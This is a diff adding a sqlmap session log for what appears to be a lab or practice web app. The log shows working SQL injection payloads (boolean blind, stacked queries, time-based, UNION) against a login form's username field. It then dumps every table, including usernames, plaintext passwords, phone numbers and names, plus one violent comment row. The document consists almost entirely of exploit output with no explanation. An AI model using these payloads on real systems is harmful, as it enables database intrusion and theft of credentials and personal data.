@@ -1,0 +1,80 @@
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: username=-3379' OR 2080=2080-- hwvY&password=test
+
+    Type: stacked queries
+    Title: PostgreSQL > 8.1 stacked queries (comment)
+    Payload: username=test';SELECT PG_SLEEP(5)--&password=test
+
+    Type: time-based blind
+    Title: PostgreSQL > 8.1 AND time-based blind
+    Payload: username=test' AND 7626=(SELECT 7626 FROM PG_SLEEP(5))-- jEUx&password=test
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 6 columns
+    Payload: username=test' UNION ALL SELECT NULL,(CHR(113)||CHR(118)||CHR(118)||CHR(106)||CHR(113))||(CHR(72)||CHR(80)||CHR(86)||CHR(72)||CHR(87)||CHR(88)||CHR(69)||CHR(116)||CHR(74)||CHR(117)||CHR(68)||CHR(83)||CHR(81)||CHR(87)||CHR(120)||CHR(107)||CHR(100)||CHR(74)||CHR(122)||CHR(69)||CHR(116)||CHR(106)||CHR(120)||CHR(85)||CHR(106)||CHR(118)||CHR(114)||CHR(105)||CHR(80)||CHR(84)||CHR(104)||CHR(112)||CHR(82)||CHR(72)||CHR(67)||CHR(87)||CHR(75)||CHR(83)||CHR(112)||CHR(107))||(CHR(113)||CHR(107)||CHR(118)||CHR(120)||CHR(113)),NULL,NULL,NULL,NULL-- rzAf&password=test
+---
+back-end DBMS: PostgreSQL
+Database: public
+Table: users
+[5 entries]
++----+---------------------+--------+----------+----------------------------+---------------+
+| id | email               | role   | username | created_at                 | password_hash |
++----+---------------------+--------+----------+----------------------------+---------------+
+| 1  | alice@example.com   | user   | alice    | 2025-10-22 18:48:12.067482 | password      |
+| 2  | bob@example.com     | user   | bob      | 2025-10-22 18:48:12.067482 | bob123        |
+| 3  | charlie@example.com | user   | charlie  | 2025-10-22 18:48:12.067482 | charlie_pw    |
+| 4  | admin@example.com   | admin  | admin    | 2025-10-22 18:48:12.067482 | admin         |
+| 5  | mallory@example.com | user   | mallory  | 2025-10-22 18:48:12.067482 | mallory       |
++----+---------------------+--------+----------+----------------------------+---------------+
+
+Database: public
+Table: comments
+[4 entries]
++----+---------+-----------------------------------+----------------------------+
+| id | user_id | content                           | created_at                 |
++----+---------+-----------------------------------+----------------------------+
+| 1  | 1       | Nice site!                        | 2025-10-22 18:48:12.067482 |
+| 2  | 2       | I disagree with the prices.       | 2025-10-22 18:48:12.067482 |
+| 4  | 3       | Contact me at charlie@example.com | 2025-10-22 18:48:12.067482 |
+| 3  | 4       | kill all children!                | 2025-10-22 18:48:12.067482 |
++----+---------+-----------------------------------+----------------------------+
+
+Database: public
+Table: orders
+[3 entries]
++----+---------+------------+-------+----------+----------------------------+
+| id | user_id | product_id | total | quantity | ordered_at                 |
++----+---------+------------+-------+----------+----------------------------+
+| 1  | 1       | 1          | 19.98 | 2        | 2025-10-22 18:48:12.067482 |
+| 2  | 2       | 4          | 49.99 | 1        | 2025-10-22 18:48:12.067482 |
+| 3  | 4       | 5          | 6.50  | 1        | 2025-10-22 18:48:12.067482 |
++----+---------+------------+-------+----------+----------------------------+
+
+Database: public
+Table: products
+[5 entries]
++----+-------+---------------+-------------+----------------------------+-----------------------+
+| id | price | name          | category    | created_at                 | description           |
++----+-------+---------------+-------------+----------------------------+-----------------------+
+| 1  | 9.99  | Basic T-Shirt | clothing    | 2025-10-22 18:48:12.067482 | Comfort cotton shirt  |
+| 2  | 29.99 | Hoodie Pro    | clothing    | 2025-10-22 18:48:12.067482 | Warm hoodie with logo |
+| 3  | 4.49  | USB Cable     | accessories | 2025-10-22 18:48:12.067482 | 1m USB-A to USB-C     |
+| 4  | 49.99 | Gaming Mouse  | electronics | 2025-10-22 18:48:12.067482 | RGB mouse, 16000dpi   |
+| 5  | 6.50  | Coffee Mug    | home        | 2025-10-22 18:48:12.067482 | Ceramic mug 300ml     |
++----+-------+---------------+-------------+----------------------------+-----------------------+
+
+Database: public
+Table: profiles
+[4 entries]
++---------+------------------------+------------+---------------+--------------+
+| user_id | bio                    | city       | phone         | full_name    |
++---------+------------------------+------------+---------------+--------------+
+| 1       | I like cats and SQL.   | Bratislava | +421900111111 | Alice Adams  |
+| 2       | Gamer and developer.   | Košice     | +421900222222 | Bob Baker    |
+| 3       | History nerd.          | Trnava     | +421900333333 | Charlie Chap |
+| 4       | Administrator account. | Bratislava | +421900000000 | Site Admin   |
++---------+------------------------+------------+---------------+--------------+
